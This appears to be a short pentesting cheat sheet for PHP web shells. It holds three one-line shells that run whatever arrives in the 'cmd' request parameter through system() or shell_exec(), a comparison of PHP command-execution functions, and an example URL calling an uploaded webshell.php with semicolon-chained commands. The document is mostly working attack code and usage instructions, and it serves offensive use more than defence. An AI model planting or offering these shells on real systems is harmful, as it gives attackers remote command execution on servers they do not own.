
```php
<?php
    echo system($_GET["cmd"]);
?>
```

```php
<?php
    echo system($_REQUEST["cmd"]);
?>
```

```php
<?php
	echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";
?>
```

`$_POST` can catch the data which is sent using POST method
`$_GET` can catch the data which is sent using GET method
`$_REQUEST` can catch the data which is sent using **both POST & GET methods**

**exec()**: returns the last line of output from the command and flushes nothing.
**shell_exec()**: returns the entire output from the command and flushes nothing.
**system()**: returns the last line of output from the command and tries to flush the output buffer after each line of the output as it goes.
**passthru()**: returns nothing and passes the resulting output without interference to the browser, especially useful when the output is in binary format.

maybe use (`2>&1`) too

Use by entering a URL and "view source" for prettier output
http://test.com/uploaded-files/webshell.php?cmd=id;whoami;ls

This also uses the fact that ; at a shell prompt makes it possible to run several commands after each other

